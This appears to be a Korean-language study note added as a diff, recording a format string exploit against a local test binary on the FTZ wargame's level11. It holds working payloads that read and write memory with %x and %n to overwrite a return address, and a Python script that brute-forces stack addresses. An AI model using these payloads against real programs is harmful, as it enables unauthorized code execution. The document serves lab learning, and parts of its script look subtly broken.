@@ -1,0 +1,73 @@
+i의 주소 : 0xbffffafc
+ret : 0xbffffaec
+
+#dummy가 3개 존재
+[level11@ftz tmp]$ ./test "AAAA %4\$x"
+AAAA 41414141
+i : 0xbffffacc
+i : 7
+
+
+#### i를 100으로 변경하기
+
+#값이 잘 들어갔는지 확인
+python -c 'print "\xcc\xfa\xff\xbf" + "\xce\xfa\xff\xbf" + "%4\$x"'
+python -c 'print "\xcc\xfa\xff\xbf" + "\xce\xfa\xff\xbf" + "%5\$x"'
+
+
+#변경할 값 집어 넣기
+./test `python -c 'print "\xcc\xfa\xff\xbf" + "%8x" + "%4\$n" '`
+[level11@ftz tmp]$ ./test `python -c 'print "\xcc\xfa\xff\xbf" + "%8x" + "%4\$n" '`
+屆?ffffc1e
+i : 0xbffffacc
+i : 12
+
+
+#주소 값 넣어보기 0xbffffaec
+0xbfff
+0xfaec
+
+$./test `python -c 'print "\xac\xfa\xff\xbf" + "\xae\xfa\xff\xbf" +  "%64228x" + "%4\$n" +  "%50451x" + "%5\$n" '`
+i : 0xbffffaac
+i : bffffaec
+[level11@ftz tmp]$ 
+
+-> 오버 플로우 공격들은 ret주소 구하는게 어렵다.  gdb결과와 직접 실행했을때 i의 주소가 다르다.
+-> gdb에 있는 주소에서 -32오프셋에 실제 위치해 있다.
+(gdb) print $esp
+$2 = (void *) 0xbffffacc
+
+>>> 0xbffffacc - 0xbffffaac
+>>> 32
+
+
+#무작위 페이로드
+그래서 gdb에서 구한 주소에 16단위로 무작위 페이로드를 작성해야 한다.
+?0, ?2만 바꿔주면 된다.
+
+import os
+import struct
+
+p = lambda x:struct.pack("<L", x)
+
+payload = """./test `python -c 'print "?0" + "?2" +  "%64228x" + "%4\$n" +  "%50451x" + "%5\$n" '`"""
+ret = 0xbffffacc
+
+#+16만큼 10번 주소 변경
+#-16만큼 10번 주소 변경
+for idx in range(0, 16*10, 16):
+    _ret = p(ret + idx)    
+    _ret2 = p(ret + idx +2)    
+
+    _payload = payload.replace("?0", _ret.strip("0x"))
+    #_payload = _payload.replace("?2", _ret2.strip("0x"))
+
+    print _payload
+
+    _ret = hex(ret - idx)    
+    _ret2 = hex(ret - idx + 2)    
+    
+    _payload = payload.replace("?0", _ret.strip("0x"))
+    _payload = _payload.replace("?2", _ret2.strip("0x"))
+
+    print _payload
